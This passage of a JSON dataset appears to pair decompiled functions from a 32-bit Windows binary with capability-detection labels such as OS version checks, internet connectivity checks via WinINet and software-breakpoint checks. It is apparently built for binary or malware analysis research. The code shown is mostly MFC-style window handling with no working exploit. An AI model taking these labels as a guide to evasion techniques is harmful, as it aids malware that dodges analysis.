        "decompiled_code": "\nvoid fcn.0041cc29(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0041ccc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041ccc0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0041cd4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041cd4e(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb();\n        if (uVar1 != unaff_EBX) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "0041d051": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041d051(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = fcn.0042b82c();\n    if ((*(iVar4 + 0x3c) != 0) && (iVar1 = *(*(iVar4 + 0x3c) + 0x20),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0x50);\n    if ((param_1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x164))(0xffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "0041d3b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d3b0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint uVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint *puStack8;\n    \n    iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(in_ECX + 0x20));\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    if (((iVar3 == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        uVar4 = 5;\n        iVar3 = *(in_ECX + 0x20);\n        while (iVar3 = (*pcVar1)(iVar3, uVar4),  iVar3 != 0) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(iVar3, &fcn.0041d3b0::var_10h);\n            puStack8 = &fcn.0041d3b0::var_10h;\n            uStack12 = 0x41d3f5;\n            fcn.00419ea1();\n            iVar2 = var_ch;\n            uStack12 = 0x15;\n            var_ch = 0;\n            var_10h = 0;\n            (*_sym.imp.USER32.dll_SetWindowPos)(iVar3, 0, arg_8h, iVar2 + arg_ch);\n            uVar4 = 2;\n        }\n    }\n    else {\n        (*_sym.imp.USER32.dll_ScrollWindow)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    if ((*(in_ECX + 0x4c) != 0) && (arg_10h == 0)) {\n        (**(**(in_ECX + 0x4c) + 0x5c))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "0041de6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041de6e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (*(param_1 + 0x4c) != 0) {\n        iVar1 = *(*(param_1 + 0x4c) + 0x44);\n        while (iVar1 != 0) {\n            piVar2 = fcn.0041c771();\n            if ((*(*piVar2 + 4) != 0) && (*(*(*piVar2 + 4) + 0x74) != 0)) {\n                iVar3 = iVar3 + 1;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 182
    },
    "0041deb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0041deb4(uint arg_8h, uint noname_1, int32_t arg_10h, uint noname_3, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h, int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0041c71c(arg_18h, arg_1ch, arg_20h, arg_24h, arg_8h);\n    if (iVar1 < 0) {\n        (**(**(in_ECX + 0x28) + 0x20))(*(in_ECX + 0x28), &var_4h);\n        iVar2 = fcn.0041de6e();\n        if (arg_10h <= iVar2 + var_4h) {\n            var_8h = *(*(in_ECX + 0x4c) + 0x44);\n            while (var_8h != 0) {\n                piVar3 = fcn.0041c771(&var_8h);\n                iVar2 = *(*piVar3 + 4);\n                if (iVar2 != 0) {\n                    if (*(iVar2 + 0x74) != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    if (var_4h == arg_10h) {\n                        iVar1 = *(*piVar3 + 4);\n                        var_18h = *(iVar1 + 0x30);\n                        var_14h = *(iVar1 + 0x34);\n                        var_10h = *(iVar1 + 0x38);\n                        var_ch = *(iVar1 + 0x3c);\n                        fcn.00419edd(&var_18h);\n                        *arg_18h = var_18h;\n                        *arg_1ch = var_14h;\n                        *arg_20h = var_10h - var_18h;\n                        *arg_24h = var_ch - var_14h;\n                        iVar1 = 0;\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 559
    },
    "0041e3b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041e3b1(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(*(param_1 + 0xc));\n        *(param_1 + 4) = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(param_1 + 0xc));\n            *(param_1 + 4) = iVar1;\n            *(param_1 + 8) = iVar1 != 0;\n        }\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 162
    },
    "0041e3e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041e3e3(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uVar1 = fcn.0041e3b1(\"InitCommonControls\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x10) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x10);\n    return;\n}\n",
        "token_count": 129
    },
    "0041e470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041e470(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) != 2) {\n        fcn.0042abcb(0, *(unaff_EBP + -0x1c));\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0041e481": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041e481(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x14) == 0) {\n        uVar1 = fcn.0041e3b1(\"InitCommonControlsEx\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x14) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x14);\n    return;\n}\n",
        "token_count": 128
    },
    "0041e520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041e520(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0041e60a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041e60a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00458e45(0);\n    iVar1 = fcn.0042b82c();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.004170a2(0x431e1b);\n        iVar3 = fcn.004170b4(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004319cf(0x48bc28, 0x41e375, 0x41c93c, 0x20, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.004170a2(uVar2);\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 321
    },
    "0041e726": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041e726(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStack16;\n    \n    iVar3 = fcn.00431568(0x419034);\n    if (iVar3 == 0) {\n        uStack16 = 0x4a8690;\n        fcn.00456b8d(&stack0xfffffff0, 0x49ed44);\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    iVar4 = fcn.0042b7b9();\n    if ((*(iVar4 + 0x14) != '\\0') && (*(iVar3 + 0x28) != 0)) {\n        uStack16 = 0x41e75a;\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n        *(iVar3 + 0x28) = 0;\n    }\n    if (*(iVar3 + 0x14) != 0) {\n        *(iVar3 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 267
    },
    "0041e7ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e7ac(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.0042536e();\n    if (iVar2 == 0) goto code_r0x0041e7f7;\n    if (*(iVar2 + 0x20) == param_1) {\n        iVar3 = fcn.0042b7b9();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.0042b7b9();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.00432188();\n                if (iVar3 == 0) goto code_r0x0041e7ec;\n            }\n            fcn.004247b8(0);\n        }\ncode_r0x0041e7ec:\n        *(iVar2 + 0x20) = 0;\n    }\n    if (*(iVar2 + 0x24) == param_1) {\n        *(iVar2 + 0x24) = 0;\n    }\ncode_r0x0041e7f7:\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 0x50))();\n        param_1[0x12] = 0;\n    }\n    if (param_1[0x13] != NULL) {\n        (**(*param_1[0x13] + 4))(1);\n    }\n    param_1[0x13] = 0;\n    if ((*(param_1 + 0xf) & 1) != 0) {\n        iVar2 = fcn.0042b82c();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x20) != 0)) {\n            fcn.00459330(&var_30h, 0, 0x30);\n            var_28h = param_1[8];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[8], 0xfffffffc);\n    fcn.0041e5da();\n    iVar3 = (*pcVar1)(param_1[8], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[8], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0041e6f8();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 750
    },
    "0041ea72": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041ea72(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *lprcDst, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t hWinPosInfo;\n    int32_t lprcSrc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_20h;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_1ch == NULL) {\n        (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x20), &lprcSrc);\n    }\n    else {\n        lprcSrc = *arg_1ch;\n        var_1ch = arg_1ch[1];\n        var_18h = arg_1ch[2];\n        var_14h = arg_1ch[3];\n    }\n    uVar2 = arg_14h & 0xffff7fff;\n    if (uVar2 == 1) {\n        hWinPosInfo = 0;\n    }\n    else {\n        hWinPosInfo = (*_sym.imp.USER32.dll_BeginDeferWindowPos)(8);\n    }\n    for (iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(in_ECX + 0x20)); iVar3 != 0;\n        iVar3 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 2)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar3);\n        uVar4 = uVar4 & 0xffff;\n        iVar5 = fcn.0041e6a5(iVar3);\n        iVar1 = iVar3;\n        if ((((uVar4 != arg_10h) && (iVar1 = var_4h,  arg_8h <= uVar4)) && (uVar4 <= arg_ch)) && (iVar5 != 0)) {\n            (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x361, 0, &hWinPosInfo);\n            iVar1 = var_4h;\n        }\n        var_4h = iVar1;\n    }\n    if (uVar2 == 1) {\n        if (arg_20h == 0) {\n            lprcDst[2] = var_10h;\n            lprcDst[1] = 0;\n            *lprcDst = 0;\n            lprcDst[3] = var_ch;\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        if ((arg_10h != 0) && (var_4h != 0)) {\n            piVar6 = fcn.0041e67e(var_4h);\n            if (uVar2 == 2) {\n                lprcSrc = lprcSrc + *lprcDst;\n                var_1ch = var_1ch + lprcDst[1];\n                var_18h = var_18h - lprcDst[2];\n                var_14h = var_14h - lprcDst[3];\n            }\n            if ((arg_14h & 0x8000) == 0) {\n                (**(*piVar6 + 0x68))(&lprcSrc, 0);\n                fcn.0041c437(&hWinPosInfo, var_4h, &lprcSrc);\n            }\n        }\n        if (hWinPosInfo != 0) {\n            (*_sym.imp.USER32.dll_EndDeferWindowPos)(hWinPosInfo);\n        }\n    }\n    return;\n}\n",
        "token_count": 949
    },
    "0041ecc1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041ecc1(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 9) != '\\0') {\n        var_4h = NULL;\n        iVar2 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar2) {\n            return var_4h;\n        }\n    }\n    piVar1 = fcn.0041e5da();\n    return piVar1;\n}\n",
        "token_count": 164
    },
    "0041ef6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0041ef6e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_44h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e78(0x38);\n    iVar1 = fcn.00431568(0x419034);\n    iVar4 = 0;\n    *(unaff_EBP + -0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041901a();\n        iVar4 = extraout_EDX;\n    }\n    puVar5 = iVar1 + 0x58;\n    puVar6 = unaff_EBP + -0x44;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(iVar1 + 0x58) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x60) = *(unaff_EBP + 0x14);\n    uVar2 = *(unaff_EBP + 0x18);\n    *(iVar1 + 0x5c) = iVar3;\n    *(iVar1 + 100) = uVar2;\n    *(unaff_EBP + -4) = iVar4;\n    if ((iVar3 == 2) && (arg_8h_00[0x13] != iVar4)) {\n        (**(*arg_8h_00[0x13] + 0x60))(iVar4);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.0041cf97(arg_8h_00, unaff_EBP + -0x28, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h_00 + 0x108))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.0041eef2(arg_8h_00, unaff_EBP + -0x28, *(unaff_EBP + 8));\n    }\n    puVar5 = unaff_EBP + -0x44;\n    puVar6 = iVar1 + 0x58;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 805
    },
    "0041f0ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041f0ac(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[8] != NULL) && (extraout_ECX != 0x4acff8)) && (extraout_ECX != 0x4ad050)) &&\n       ((extraout_ECX != 0x4ad0a8 && (extraout_ECX != 0x4ad100)))) {\n        fcn.0041e8bd();\n    }\n    if (extraout_ECX[0x13] != NULL) {\n        (**(*extraout_ECX[0x13] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x28) == extraout_ECX)) {\n        *(pcVar1 + 0x28) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004220a2();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 342
    },
    "0041f23b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f23b(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[8] != 0)) {\n        iVar2 = (**(*param_1 + 0x120))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0041f1fc();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0041f1fc();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 189
    },
    "0041f27a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f27a(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0041e6a5(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041ef6e(iVar2, *(iVar2 + 0x20), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041f27a(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "0041f4a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f4a4(int32_t arg_8h, int32_t arg_ch, ushort *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (*(in_ECX + 0x4c) != 0) {\n        var_8h = arg_8h;\n        var_4h = arg_ch;\n        (*_sym.imp.USER32.dll_ScreenToClient)(*(in_ECX + 0x20), &var_8h);\n        iVar2 = fcn.0041f3ee();\n        if (*(in_ECX + 0x4c) != 0) {\n            iVar1 = *(*(in_ECX + 0x4c) + 0x44);\n            while (iVar1 != 0) {\n                piVar3 = fcn.0041c771();\n                iVar4 = *(*piVar3 + 4);\n                if ((iVar4 != 0) && (*(iVar4 + 0x74) != 0)) {\n                    iVar2 = iVar2 + 1;\n                    iVar4 = (*_sym.imp.USER32.dll_PtInRect)(iVar4 + 0x30, var_8h, var_4h);\n                    if (iVar4 != 0) {\n                        *arg_10h = 3;\n                        *(arg_10h + 4) = iVar2;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\n    uVar5 = fcn.0041c78a(arg_8h, arg_ch, arg_10h);\n    return uVar5;\n}\n",
        "token_count": 423
    },
    "0041f548": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
